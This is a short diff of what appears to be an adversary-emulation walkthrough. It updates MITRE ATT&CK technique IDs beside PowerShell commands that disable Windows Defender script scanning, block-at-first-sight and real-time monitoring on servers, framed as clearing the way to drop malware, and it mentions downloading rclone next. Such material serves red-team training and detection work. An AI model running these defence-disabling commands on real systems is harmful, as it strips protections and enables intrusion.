@@ -95,7 +95,7 @@ Now let's disable a bunch of useful things in Windows Defender. We can turn off 
 [ITSERVER:PowerShell] Set-MpPreference -DisableScriptScanning 1
 [ITSERVER:PowerShell] Set-MpPreference -DisableBlockAtFirstSeen 1
 ```
-ATT&CK Techniques: `T1562.001`
+ATT&CK Techniques: `T1685`
 
 Now the system won't put up a fight when we drop malware on it.
 
@@ -272,7 +272,7 @@ But let's do one more quick additional step and disable Realtime Monitoring in W
 ```PowerShell
 [FINSERVER:PowerShell] Set-MpPreference -DisableRealtimeMonitoring 1
 ```
-ATT&CK Techniques: `T1562.001`
+ATT&CK Techniques: `T1685`
 
 We can now download the `rclone` executable:
 
